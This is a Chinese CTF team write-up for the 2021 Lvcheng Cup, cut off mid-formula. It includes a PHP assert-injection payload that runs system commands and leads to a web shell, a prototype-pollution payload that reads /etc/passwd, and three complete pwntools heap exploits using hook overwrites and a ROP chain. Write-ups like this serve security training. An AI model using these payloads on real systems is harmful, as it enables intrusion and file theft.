@@ -1,0 +1,770 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2021年绿城杯Light1ng战队Writeup | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2021年绿城杯Light1ng战队Writeup | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="Light1ng战队
+一、战队信息
+
+名称：Light1ng
+排名：16
+
+二、解题情况
+进不去平台了，没法截图了
+三、解题过程
+Web
+1.ezphp
+ezphp
+在关于里看到个Git，所以考虑存在git泄露
+
+index.php里的ph..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2021年绿城杯Light1ng战队Writeup
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-09-29
+              </span>
+              <span>
+                15 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="light1ng战队">Light1ng战队</h1>
+<h3 id="一-战队信息">一、战队信息</h3>
+<ul>
+<li>名称：Light1ng</li>
+<li>排名：16</li>
+</ul>
+<h2 id="二-解题情况">二、解题情况</h2>
+<p>进不去平台了，没法截图了</p>
+<h3 id="三-解题过程">三、解题过程</h3>
+<h3 id="web">Web</h3>
+<h4 id="1ezphp">1.ezphp</h4>
+<h3 id="ezphp">ezphp</h3>
+<p>在关于里看到个Git，所以考虑存在git泄露</p>
+<figure data-type="image" tabindex="1"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/c5f41d30eca64.png" alt="1632917280027.png" loading="lazy"></figure>
+<p>index.php里的php代码</p>
+<pre><code class="language-php">&lt;?php
+
+if (isset($_GET['link_page'])) {
+	$link_page = $_GET['link_page'];
+} else {
+	$link_page = &quot;home&quot;;
+}
+
+$page_file = &quot;pages/&quot; . $link_page . &quot;.php&quot;;
+
+$safe_check1 = &quot;strpos('$page_file', '..') === false&quot;;
+assert($safe_check1) or die(&quot;no no no!&quot;);
+
+// safe!
+$safe_check2 = &quot;file_exists('$page_file')&quot;;
+assert($safe_check2) or die(&quot;no this file!&quot;);
+?&gt;
+</code></pre>
+<p>由于assert会进行命令执行，且$link_page参数可控，所以此处存在rce</p>
+<p>构造闭合：</p>
+<p><code>?link_page=flag.php', '..') === true|eval($_POST['yy']);//</code></p>
+<p>POST传参：</p>
+<pre><code>yy=system('ls /');
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/18574b45b2bbb.png" alt="1632917308444.png" loading="lazy"></figure>
+<p>执行成功，蚁剑连接：</p>
+<figure data-type="image" tabindex="3"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/d3cb022fae753.png" alt="1632917340425.png" loading="lazy"></figure>
+<p>在pages目录下拿到flag</p>
+<figure data-type="image" tabindex="4"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/8563d53f9255b.png" alt="1632917361359.png" loading="lazy"></figure>
+<p>DASCTF{af5ff99c7f98d528e711acc42fd6b906}</p>
+<h4 id="2looking-for-treasure">2.Looking for treasure</h4>
+<figure data-type="image" tabindex="5"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/fd07753a36a42.png" alt="1632909794040.png" loading="lazy"></figure>
+<p>打开源码 有提示。</p>
+<p>下载到源码 审计。</p>
+<p>有一处</p>
+<figure data-type="image" tabindex="6"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/c2ad6f1333d86.png" alt="1632910184458.png" loading="lazy"></figure>
+<p>这里读取了p文件，如果能控制p的值就能实现文件读取。</p>
+<figure data-type="image" tabindex="7"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/b713f6e59229c.png" alt="1632910656643.png" loading="lazy"></figure>
+<p>这个content和req.body肯定是不相同的不用管它 ，所以p的内容最后会在报错信息的content里发出</p>
+<p>看看p是怎么来的</p>
+<figure data-type="image" tabindex="8"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/02dc2fdb3f5ae.png" alt="1632910389467.png" loading="lazy"></figure>
+<p>config.path给p赋值。所以得想办法控制path的值。</p>
+<p>源码里看到</p>
+<figure data-type="image" tabindex="9"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/83ecc9e2c77e8.png" alt="1632910536698.png" loading="lazy"></figure>
+<p>看到这个想到json-schema原型链污染</p>
+<p>payload</p>
+<pre><code class="language-json">{&quot;$schema&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/etc/passwd&quot;}}}}}}
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/84af7faf60cfb.png" alt="1632910735053.png" loading="lazy"></figure>
+<p>成功读到了/etc/passwd的内容，猜测flag在根目录，直接读/flag</p>
+<pre><code class="language-json">{&quot;$schema&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/flag&quot;}}}}}}
+</code></pre>
+<p>数据包</p>
+<pre><code class="language-http">POST /validated HTTP/1.1
+Host: 26db192b-6f66-42c2-b783-cbe5f58cbd88.zzctf.dasctf.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json
+Content-Length: 132
+Origin: http://26db192b-6f66-42c2-b783-cbe5f58cbd88.zzctf.dasctf.com
+Connection: close
+Referer: http://26db192b-6f66-42c2-b783-cbe5f58cbd88.zzctf.dasctf.com/
+Upgrade-Insecure-Requests: 1
+
+{&quot;$schema&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;__proto__&quot;:{&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:{&quot;path&quot;:{&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/flag&quot;}}}}}}
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/b8d65a7d90fa3.png" alt="1632918056943.png" loading="lazy"></figure>
+<p><code>DASCTF{5117143e660f592adc982dd96d2c3f17}</code></p>
+<h3 id="pwn">PWN</h3>
+<h4 id="1null">1.null</h4>
+<p>正常的菜单堆题，off-by-one漏洞，我没可以看见edit和add中都有read_input（）函数，而漏洞点就在这个read_input（）函数中</p>
+<figure data-type="image" tabindex="12"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/da948a0071c2d.png" alt="1632916927458.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/b447cfd9f6480.png" alt="1632916950577.png" loading="lazy"></figure>
+<p>可以看见a2+1多读了一个字节我们可以利用这个漏洞来改写chunk的大小造成堆块的重叠。</p>
+<p>Exp：</p>
+<pre><code class="language-python">from pwn import *
+#io=process('./null')
+io=remote('82.157.5.28',50404)
+elf=ELF('./null')
+#libc=elf.libc
+libc=ELF('./libc-2.23')
+
+def choice(choice):
+	io.sendlineafter('choice :',str(choice))
+
+def malloc(index,size,context):
+	choice(1)
+	io.sendlineafter('Index:',str(index))
+	io.sendlineafter('Size of Heap : ',str(size))
+	io.sendafter('Content?:',context)
+
+def free(index):
+	choice(2)
+	io.sendlineafter('Index:',str(index))
+
+def edit(index,context):
+	choice(3)
+	io.sendlineafter('Index:',str(index))
+	io.sendafter('Content?:',context)
+
+def view(index):
+	choice(4)
+	io.sendlineafter('Index :',str(index))
+
+def pwn():
+	malloc(0,0x18,'0\n')
+	malloc(1,0x78,'1\n')
+	malloc(2,0x68,'2\n')
+	malloc(3,0x68,'3\n')
+	malloc(4,0x88,'4\n')
+	edit(0,'0'*0x18+p8(0xf1))
+	free(1)
+	malloc(1,0x78,'\n')
+	view(2)
+	addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
+	mallochook=addr-0x68
+	libcbase=mallochook-libc.symbols['__malloc_hook']
+	onegadget=[0x45226,0x4527a,0xf03a4,0xf1247]
+	
+	malloc(5,0x68,'5\n')
+	free(5)
+	edit(2,p64(mallochook-0x23)+'\n')
+	malloc(6,0x68,'6\n')
+	malloc(7,0x68,'7'*0x13+p64(onegadget[3]+libcbase))#malloc_hook
+	io.sendlineafter('choice :','1')
+	io.sendlineafter('Index:','8')
+	io.sendlineafter('Size of Heap : ',str(0x18))
+
+	io.interactive()
+pwn()
+</code></pre>
+<h4 id="2uaf">2.uaf</h4>
+<p>正常的菜单题</p>
+<p>漏洞点在，free后指针没有置0，造成uaf漏洞，直接freechunk泄露libc，打malloc_hook</p>
+<figure data-type="image" tabindex="14"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/9cf8af3f9f5bf.png" alt="1632917032904.png" loading="lazy"></figure>
+<p>Exp：</p>
+<pre><code class="language-python">from pwn import *
+
+sh=remote('82.157.5.28',51402)
+
+context.log_level='debug'
+
+elf=ELF('./uaf_pwn')
+
+libc=elf.libc
+def exp():
+
+    def add(size):
+
+        sh.sendlineafter(&quot;&gt;&quot;,&quot;1&quot;)
+
+        sh.sendlineafter(&quot;size&gt;&quot;,str(size))
+
+    def dele(idx):
+
+        sh.sendlineafter(&quot;&gt;&quot;,&quot;2&quot;)
+
+        sh.sendlineafter(&quot;index&gt;&quot;,str(idx))
+
+    def edit(idx,content):
+
+        sh.sendlineafter(&quot;&gt;&quot;,&quot;3&quot;)
+
+        sh.sendlineafter(&quot;index&gt;&quot;,str(idx))
+
+        sh.sendlineafter(&quot;content&gt;&quot;,content)
+
+    def show(idx):
+
+        sh.sendlineafter(&quot;&gt;&quot;,&quot;4&quot;)
+
+        sh.sendlineafter(&quot;index&gt;&quot;,str(idx))
+
+    add(0x80)
+
+    add(0x60)
+
+    add(0x60)
+
+    add(0x60)
+
+    add(0x60)
+
+    for i in range(4):
+        edit(i,str(i)*8)
+    dele(0)
+    show(0)
+    libc_base = u64(sh.recv(6).ljust(8,&quot;\x00&quot;))-88 - 0x10-libc.sym[&quot;__malloc_hook&quot;]
+    success(&quot;libc_base =&gt; 0x%x&quot;,libc_base)
+    malloc_hook = libc_base + libc.sym[&quot;__malloc_hook&quot;]
+    add(0x80)
+    dele(1)
+    dele(3)
+    dele(1)
+    edit(1,p64(malloc_hook-0x23))
+    gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
+    add(0x60)
+    add(0x60)
+
+    edit(7,&quot;a&quot;*0x13+p64(gadget[1]+libc_base))
+    add(0x90)
+    sh.interactive()
+exp()
+</code></pre>
+<h4 id="3greentownnote">3.Greentownnote</h4>
+<p>这个题的漏洞在于dele这个操作，并没将ptr+8置0</p>
+<figure data-type="image" tabindex="15"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/b7a35f04f321c.png" alt="1632917088422.png" loading="lazy"></figure>
+<p>在这可以看到有沙箱函数禁用了exevce，只能读取flag</p>
+<figure data-type="image" tabindex="16"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/68f82f0c869b8.png" alt="1632917105380.png" loading="lazy"></figure>
+<p>整体逻辑如下，有正常的add，dele，show功能</p>
+<figure data-type="image" tabindex="17"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/749d0d95b2feb.png" alt="1632917120610.png" loading="lazy"></figure>
+<p>直接doublefree泄露libc，利用libc中的函数context可以对其进行栈迁移，我们在堆上提前布置好rop，在利用free_hook函数触发，context+53，将栈迁移到我们布置好的rop处，然后利用srop将rip指向syscall，读取flag</p>
+<p>完整exp：</p>
+<pre><code class="language-python">from pwn import *
+
+io = remote('82.157.5.28',51301)
+elf = ELF('./GreentownNote')
+libc = ELF('./libc-2.27.so')
+context.log_level='debug'
+context.arch='amd64'
+
+def add(size,content):
+    io.sendlineafter('choice :','1')
+    io.sendlineafter('size :',str(size))
+    io.sendlineafter('Content :',content)
+
+def show(index):
+    io.sendlineafter('choice :','2')
+    io.sendlineafter('Index :',str(index))
+
+def dele(index):
+    io.sendlineafter('choice :','3')
+    io.sendlineafter('Index :',str(index))
+
+add(0x100,'a'*(0x10))
+add(0x100,'')
+dele(0)
+dele(0)
+
+show(0)
+io.recvuntil(&quot;Content: &quot;)
+leak = u64(io.recv(6).ljust(8,'\x00'))
+heap_base = leak - 0x260
+success(hex(heap_base))
+add(0x100,p64(heap_base+0x10))
+add(0x100,'a'*8)
+add(0x100,'\x07'*0x40)
+dele(3)
+show(3)
+addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+malloc_hook = addr-0x70
+libc_base = malloc_hook-libc.sym['__malloc_hook']
+free_hook = libc_base + libc.sym['__free_hook']
+
+setcontext = libc.sym['setcontext']+libc_base+53
+syscall = libc.search(asm(&quot;syscall\nret&quot;)).next()+libc_base
+print('libc_base',hex(libc_base))
+add(0x100,'\x07'*0x80+p64(free_hook))
+add(0x90,p64(setcontext))
+
+frame = SigreturnFrame()
+frame.rsp = (free_hook&amp;0xfffffffffffff000)+8
+frame.rax = 0
+frame.rdi = 0
+frame.rsi = free_hook&amp;0xfffffffffffff000
+frame.rdx = 0x280
+frame.rip = syscall
+
+pop_rdi=libc.search(asm('pop rdi\nret')).next()
+pop_rsi=libc.search(asm('pop rsi\nret')).next()
+pop_rdx=libc.search(asm('pop rdx\nret')).next()
+pop_rax=libc.search(asm('pop rax\nret')).next()
+
+add(0xf8,bytes(frame)[0:0xf8])
+dele(5)
+#open('./flag',0)
+code = [pop_rdi+libc_base,free_hook&amp;0xfffffffffffff000,pop_rsi+libc_base,0,pop_rdx+libc_base,0,pop_rax+libc_base,2,syscall]
+#read(0,addr,0x40)
+code+=[pop_rdi+libc_base,3,pop_rsi+libc_base,(free_hook&amp;0xfffffffffffff000)+0x400,pop_rdx+libc_base,0x40,pop_rax+libc_base,0,syscall]
+#write(1,addr,0x40)
+code+=[pop_rdi+libc_base,1,pop_rax+libc_base,1,syscall]
+shellcode='./flag'.ljust(8,'\x00')
+shellcode+=flat(code)
+io.sendline(shellcode)
+io.interactive()
+</code></pre>
+<h3 id="re">RE</h3>
+<h4 id="1easy_re">1.easy_re</h4>
+<p>程序不难，丢入OD，进行分析</p>
+<figure data-type="image" tabindex="18"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/0562c6ef5da6d.png" alt="1632917606832.png" loading="lazy"></figure>
+<p>发现仅仅是单纯的xor加密,这就好办了,只需要把加密数据dump出来，然后在dump回输入内存，即可让他自动解密（取了个巧，算法没看，猜测可能是RC4魔改）</p>
+<figure data-type="image" tabindex="19"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/99f507117a909.png" alt="1632917626400.png" loading="lazy"></figure>
+<p>加密数据如上图</p>
+<figure data-type="image" tabindex="20"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/4fb33fd76ae91.png" alt="1632917648721.png" loading="lazy"></figure>
+<p>Dump过去，程序自动解密即可</p>
+<h4 id="2warmupbabyvxworks">2.[warmup]babyvxworks</h4>
+<p>IDA上来就开幕雷击</p>
+<figure data-type="image" tabindex="21"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/2d9beb0ed5c85.png" alt="1632917721720.png" loading="lazy"></figure>
+<p>很明显，这是一个花指令,直接nop掉</p>
+<figure data-type="image" tabindex="22"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/063c638b3bc33.png" alt="1632917742981.png" loading="lazy"></figure>
+<p>手动处理完，类似上图的所有花指令后，直接IDA F5</p>
+<figure data-type="image" tabindex="23"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/5ec5fe8dc89cb.png" alt="1632917759315.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/a649b0e037d96.png" alt="1632917770360.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/b0dcaf6d191c2.png" alt="1632917783353.png" loading="lazy"></figure>
+<p>Helloworld干了个啥，我也不晓得，但是,算法很明显，就是递归异或0x22，并加3，直接写脚本跑</p>
+<figure data-type="image" tabindex="26"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/778cd4ec75937.png" alt="1632917798581.png" loading="lazy"></figure>
+<p>flag:</p>
+<pre><code>flag{helo_w0rld_W3lcome_70_R3}
+</code></pre>
+<h4 id="3抛石机">3.抛石机</h4>
+<p>先搞清程序如何执行成功</p>
+<figure data-type="image" tabindex="27"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/fab35a00612b1.png" alt="1632917865447.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/977dd2013b562.png" alt="1632917874585.png" loading="lazy"></figure>
+<p>很明显，就是要让x&lt;=y-0.001 z&lt;=d-0.001且要满足那4个一元二次方程，因为不论是v1,v2,v3,v4的取值范围都很小，无限接近于0，不妨设v1=v2=v3=v4=0，然后解这4个一元二次方程(还是在线解吧:http://www.ab126.com/shuxue/8009.html)，解得4个值:x1 = 1.08 , x2 = 4.33,x3 = -0.48 , x4 = 1.98，这是4个双浮点数，将他们转为字节</p>
+<figure data-type="image" tabindex="29"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/324247e43ad45.png" alt="1632917897160.png" loading="lazy"></figure>
+<p>其余3个也是如上图这样转换，然后根据x&lt;=y-0.001 z&lt;=d-0.001，可知x=1.08,y=4.33,d=1.98,z=-0.48</p>
+<p>回到开始，这里其实是一个格式的固定，判断是否为flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxx}格式的flag，并不是照抄,x仅仅代表的是任意字符</p>
+<figure data-type="image" tabindex="30"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/76e91737f8f11.png" alt="1632917917707.png" loading="lazy"></figure>
+<p>全局变量初始化</p>
+<figure data-type="image" tabindex="31"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/0f8c26bbf2dec.png" alt="1632917933686.png" loading="lazy"></figure>
+<p>运算结果，然后进行比较</p>
+<figure data-type="image" tabindex="32"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/f4e1600f98855.png" alt="1632917956912.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="33"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/06ab2eb5dc4f8.png" alt="1632917970247.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/bce6fef8d709c.png" alt="1632917978890.png" loading="lazy"></figure>
+<p>这里通过动调不难发现规律，输入:13,返回结果就是13，输入ab，返回结果就是AB。</p>
+<p>当然这里有个细节得注意，这里仅仅只操作了4个字节，而我们运算的双浮点数是8个字节，很明显不满足我们的条件，所以是算法的问题吗？No，其实后面4个字节，对整体双浮点数的影响微乎其微，所以我们可以舍弃掉，毕竟，他毕竟的是一个范围，而不是一个确切的数字，所以经过计算(我是手工，别骂，flag好像有多组，不知道是不是题的bug):flag{48e17a14-52b8-1e85-b81e-85ebae47e17a}</p>
+<figure data-type="image" tabindex="35"><img src="http://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2021/09/29/f00f63313d6f9.png" alt="1632917994054.png" loading="lazy"></figure>
+<h3 id="crypto">Crypto</h3>
+<h4 id="1rsa-1">1.RSA-1</h4>
+<p>易知n,c都是p的倍数,求两者公倍数即可得到p,后面简单求RSA即可</p>
+<pre><code class="language-python">from gmpy2 import *
+
+from Crypto.Util.number import *
+
+n =
+
+173652311549263483644782768725584927759117606030023943537236034618984057402347150
+
+018201115486009149076170038066524923916867102562741566778871019971756922777296484
+
+560875349876167437246465982344660947795407294135838263551452779804790401570754536
+
+942505723166383481215712187597695337387215068111758669908519728384663075942262938
+
+369341166596852157756432854658953177558927544733320342344957959361836105695710164
+
+005353627626995176867816023020450485321314260352608789798921694410594676235230605
+
+692855705771992363098881558330137219979339604577846532620761355617698387041668103
+
+84309655788983073376941843467117256002645962737847
+
+c =
+
+694496710881543773542894128678411940313831971345573215592505592864653696259767294
+
+180583131213068933801491345208129640027286271044720726509975040165782816583601312
+
+284865683910085471996518868009737549119324912772559966038374682703180306602649798
+
+929885642021625020603506818096379745479215119107143364594624591491673263700711708
+
+519944289449566745554451748340400653660712148067868800042042228138053936851980716 
+
+217509976389198864811793777795106989997526019001899583490454144756271830743390659
+
+202122666688563887702030400561445076308133708283860841475616225382569742049350991
+
+4578546951634127502393647068722995363753321912676
+
+p=gcd(n,c)
+
+q=n//p 
+
+phi=(p-1)*(q-1)
+
+e=65537
+
+d=invert(e,phi)
+
+M=powmod(c,d,n)
+
+m=M//2021//1001//p
+
+print(long_to_bytes(m)) 
+</code></pre>
+<p>flag:</p>
+<pre><code>flag{Math_1s_1nterest1ng_hah}
+</code></pre>
+<h4 id="2warmup">2.Warmup</h4>
+<p>仿射加密,简单逆一下就行</p>
+<pre><code class="language-python">str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+c='aoxL{XaaHKP_tHgwpc_hN_ToXnnht}'
+s=''
+for i in c:
+    if i in str1:
+        a=str1.find(i)
+        s+=str1[((a-23)*45)%52]
+print(s)
+</code></pre>
+<p>flag:</p>
+<pre><code>flag{AffInE_CIpheR_iS_clAssiC}
+</code></pre>
+<h4 id="3rsa_plus">3.RSA_plus</h4>
+<h5 id="第一部分">第一部分</h5>
+<p>n1是四个素数的乘积，其中<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mi mathvariant="normal">和</mi><msub><mi>p</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>q</mi><mi mathvariant="normal">和</mi><msub><mi>q</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">p和p_1,q和q_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>相近，将n1放入在线网站factordb中分解得到N1和N2，通过开根爆破的方式运行很久都没有出答案，于是可以猜测N1和N2不是由<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∗</mo><mi>p</mi><mn>1</mn><mi mathvariant="normal">和</mi><mi>q</mi><mo>∗</mo><mi>q</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">p*p1和q*q1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mord">1</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord">1</span></span></span></span>得到，而是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>p</mi><mo>∗</mo><mi>q</mi><mn>1</mn><mi mathvariant="normal">和</mi><mi>p</mi><mn>1</mn><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p*q1和p1*q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord">1</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault">p</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span></span></span></span>得到，假设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>p</mi><mn>1</mn></msub><mo>=</mo><mi>p</mi><mo>+</mo><msub><mi>p</mi><mn>0</mn></msub><mo separator="true">;</mo><msub><mi>q</mi><mn>1</mn></msub><mo>=</mo><mi>q</mi><mo>+</mo><msub><mi>q</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">p_1=p+p_0;q_1=q+q_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span 